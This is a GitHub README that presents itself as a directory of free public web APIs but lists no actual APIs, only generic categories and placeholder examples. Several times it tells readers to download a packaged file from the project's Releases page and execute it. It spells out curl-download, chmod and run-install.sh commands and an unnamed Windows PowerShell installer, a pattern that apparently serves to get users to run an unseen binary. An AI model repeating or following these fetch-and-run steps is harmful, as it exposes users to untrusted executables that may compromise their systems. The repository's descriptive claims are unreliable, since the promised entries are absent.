[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github&style=for-the-badge)](https://github.com/Rithick28/Free-Public-APIs/releases)

# Free Public APIs Directory — Fast, Reliable, Open Access APIs 🚀

Public APIs for Free  
Topics: api · free · public

[![API Topic](https://raw.githubusercontent.com/github/explore/main/topics/api/api.png)](https://github.com/topics/api)

Table of contents
- About
- Badges
- Quick start
- Browse categories
- How to use an API
- Example requests
- Tools and utilities
- Contribute
- Releases
- License
- Contact

About
This repository collects free, public web APIs. Each entry links to an API endpoint, docs, and examples. The list focuses on useful, stable APIs for developers, data scientists, and hobbyists. Use the collection to find endpoints for weather, maps, finance, images, text, and more.

Badges
- [![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github&style=flat-square)](https://github.com/Rithick28/Free-Public-APIs/releases)
- ![Topics](https://img.shields.io/badge/topics-api%2Cfree%2Cpublic-lightgrey?style=flat-square)
- ![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)
- ![Last commit](https://img.shields.io/github/last-commit/Rithick28/Free-Public-APIs?style=flat-square)

Quick start
1. Clone the repo.
   - git clone https://github.com/Rithick28/Free-Public-APIs.git
2. Browse the list in the README or the data folder.
3. Pick an API entry. Each entry shows:
   - Name
   - Base URL
   - Auth type
   - Rate limits
   - Docs link
   - Example calls

If you need a packaged tool from Releases, download the file and execute it as described in the Releases section. The Releases page hosts packaged bundles and helper scripts for quick setup. Download the file and run it locally to install helper tools.

Browse categories
This list groups APIs by category. Each group contains the most common endpoints and a quick example.

- Weather & Environment
  - Current weather
  - Forecasts
  - Air quality
- Maps & Geolocation
  - Reverse geocoding
  - Routing
  - Static maps
- Finance & Crypto
  - Market prices
  - Exchange rates
  - Historical OHLC
- Media & Images
  - Image search
  - Thumbnails
  - Image metadata
- Text & Language
  - Sentiment
  - Translation
  - Text analysis
- Data & Utilities
  - Public datasets
  - Random data
  - IP tools
- Entertainment
  - Quotes
  - Music
  - Movies

How to read an API entry
Each API entry follows a compact schema. Read the example below and apply the steps to any entry.

- name: The API name.
- base_url: The root endpoint.
- auth: none | apiKey | oauth2
- rate_limit: e.g. 60 requests/min
- docs: Link to full documentation
- example: One or two example calls

How to use an API (step-by-step)
1. Check auth. If the API needs an apiKey, register on the provider site and copy the key.
2. Check rate limits. Plan retries or caching.
3. Test the endpoint with curl or an HTTP client.
4. Parse JSON or XML responses.
5. Handle errors with status codes and retries.

Common patterns
- REST GET for reads.
- POST for creation or complex queries.
- JSON responses with standard fields.
- HTTP status codes for errors.

Example requests
Replace placeholders with real values.

- curl GET
  - curl -s "https://api.example.com/v1/resource?key=API_KEY&query=test"
- curl POST JSON
  - curl -s -X POST "https://api.example.com/v1/submit" -H "Content-Type: application/json" -d '{"name":"test"}'
- Python requests
  - import requests
    r = requests.get("https://api.example.com/v1/resource", params={"key": "API_KEY", "q": "test"})
    data = r.json()

Tips for reliable calls
- Use connection pooling in long-running apps.
- Cache GET responses when data does not change often.
- Respect rate limits. Back off on 429 responses.
- Use timeouts on requests.

Tools and utilities
This repo includes suggestions and helper scripts.

- httpie — Simple CLI HTTP client.
- jq — Parse and format JSON on the command line.
- Postman collection — Import endpoints into Postman.
- Python snippets — Minimal clients for each API group.

Sample Python client (pattern)
- Use requests.Session for connection reuse.
- Wrap calls in try/except and check r.raise_for_status().
- Parse r.json() and map fields to your domain models.

Contribute
Contributions keep the list accurate and useful. Follow these steps to add or update an API entry.

1. Fork the repository.
2. Add or edit an entry in the relevant section.
3. Use the schema described in "How to read an API entry".
4. Run a quick validation script if provided.
5. Submit a pull request with a clear title and description.

Pull request checklist
- API name and base URL present.
- Auth type correct.
- Docs link points to official documentation.
- Example works with public demo keys if available.
- No broken links.

Maintainers will review requests and merge entries that match the schema.

Release packages and helper scripts
The Releases page hosts packaged scripts and tools. Download the file and execute it to install helper utilities or to import the collection into other tools.

- Visit the Releases page here:
  - https://github.com/Rithick28/Free-Public-APIs/releases
- The Releases URL contains a path. Download the packaged file that matches your platform.
- After downloading:
  - On macOS / Linux:
    - chmod +x ./tool-name
    - ./tool-name install
  - On Windows:
    - Run the included installer or execute the PowerShell script with the provided parameters.

Example: download and run with curl (generic)
- curl -L -o tool.tar.gz "https://github.com/Rithick28/Free-Public-APIs/releases/download/v1.0/tool.tar.gz"
- tar -xzf tool.tar.gz
- chmod +x tool/install.sh
- ./tool/install.sh

Changelog and versions
The Releases page lists versioned builds and changelogs. Check the tags on Releases for breaking changes and migration notes.

Search and filter
Use the repo search to find specific APIs. Use queries like:
- "weather api" to find weather endpoints
- "auth:apiKey" to find APIs that require an API key
- "rate_limit" to find entries with documented limits

Examples and sample apps
This repo includes example apps and snippets that demonstrate how to call multiple public APIs together.

- Weather + Geolocation sample
  - Fetch user IP
  - geolocate IP
  - fetch local weather
- Currency convert sample
  - Fetch exchange rates
  - Convert between currencies

Security and auth
- Never ship real API keys in the repo.
- Use environment variables for secrets.
- Rotate keys if you suspect a leak.
- Use HTTPS for all API calls.

Data quality and reliability
- Each entry lists the provider's uptime and SLA if available.
- Maintain notes for known outages or changes.
- Mark deprecated endpoints and suggest alternatives.

License
This repository uses the MIT license. See the LICENSE file for details.

Contact
Open issues to report broken links, outdated docs, or to request new APIs. When you open an issue, include:
- The API name.
- The broken link or the change needed.
- A short reproduction or example.

Resources and links
- GitHub Releases: https://github.com/Rithick28/Free-Public-APIs/releases
- Helpful tools:
  - https://httpie.io
  - https://stedolan.github.io/jq/
  - https://www.postman.com

Images and icons used
- GitHub topic image: https://raw.githubusercontent.com/github/explore/main/topics/api/api.png
- Badges from img.shields.io

Acknowledgements
This collection builds on public directories, official docs, and community contributions. Contributors add APIs, validate links, and provide samples.

Contact and social
Open an issue or submit a PR on GitHub. Mention the API name and the change you propose.

End of file